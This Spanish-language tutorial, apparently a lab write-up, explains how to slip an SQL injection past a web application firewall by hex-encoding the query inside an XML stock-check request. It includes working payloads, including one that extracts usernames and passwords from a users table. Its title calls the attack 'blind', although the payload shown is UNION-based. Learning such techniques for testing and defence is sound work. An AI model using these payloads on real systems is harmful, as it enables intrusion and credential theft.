# **Bypassing WAF en Blind SQL Injection con XML Encoding**  

Los **Web Application Firewalls (WAFs)** pueden bloquear ataques SQL Injection al detectar palabras clave como `UNION`, `SELECT` o `--`. Sin embargo, algunos WAFs tienen problemas con la decodificación de ciertos formatos, lo que permite **bypass usando XML Encoding**.  

---

## **1. Identificación de la inyección**  

Tenemos una aplicación que envía datos en formato **XML**, específicamente en el cuerpo de una solicitud **POST**:  

```xml
<stockCheck>
    <productId>2</productId>
    <storeId>1</storeId>
</stockCheck>
```

Intentamos modificar el valor `storeId` para probar si el campo es vulnerable.  

### **🔎 Prueba de evaluación matemática**  

Si enviamos:  

```xml
<stockCheck>
    <productId>2</productId>
    <storeId>1+1</storeId>
</stockCheck>
```

Y el servidor devuelve un resultado equivalente a **2**, significa que el campo `storeId` **evalúa expresiones** antes de ejecutarlas en la base de datos.  

---

## **2. Bloqueo del WAF en SQL Injection**  

Intentamos un **ataque UNION básico**:  

```
1+7 UNION SELECT NULL
```

📌 **Resultado:** 🚫 `Attack Detected!`  

El WAF está bloqueando **"UNION SELECT"** dentro del parámetro `storeId`.  

---

## **3. Bypass con XML Encoding**  

Para evadir el WAF, podemos **encodear nuestra consulta SQL en formato hexadecimal**, usando la extensión **Hackvertor** en Burp Suite:  

```xml
<stockCheck>
    <productId>2</productId>
    <storeId><@hex_entities>1+7 UNION SELECT username||':'||password from public.users--<@/hex_entities></storeId>
</stockCheck>
```

📌 **Explicación del payload:**  

1. **`<@hex_entities>...</@hex_entities>`**  
   - Hackvertor convierte la consulta en entidades hexadecimales para que el WAF no la detecte.  
   
2. **`1+7 UNION SELECT username||':'||password FROM public.users--`**  
   - Bypass del filtro **al ocultar "UNION SELECT" en formato hexadecimal**.  
   - `username||':'||password` concatena usuario y contraseña en una sola cadena.  

---

## **4. Decodificación en el servidor**  

🔹 Si el servidor **decodifica automáticamente el contenido XML**, entonces ejecutará la consulta sin que el WAF la bloquee.  
🔹 Como resultado, obtenemos **las credenciales de los usuarios** sin activar las protecciones del WAF.  

---

## **5. Conclusión**  

✅ **XML Encoding** permite **bypassear WAFs** que bloquean SQL Injection en texto plano.  
✅ **Hackvertor** en Burp Suite simplifica el proceso de encoding.  

🚀 **Esta técnica es útil cuando los ataques tradicionales son bloqueados, pero la aplicación procesa XML y evalúa expresiones dinámicamente.**
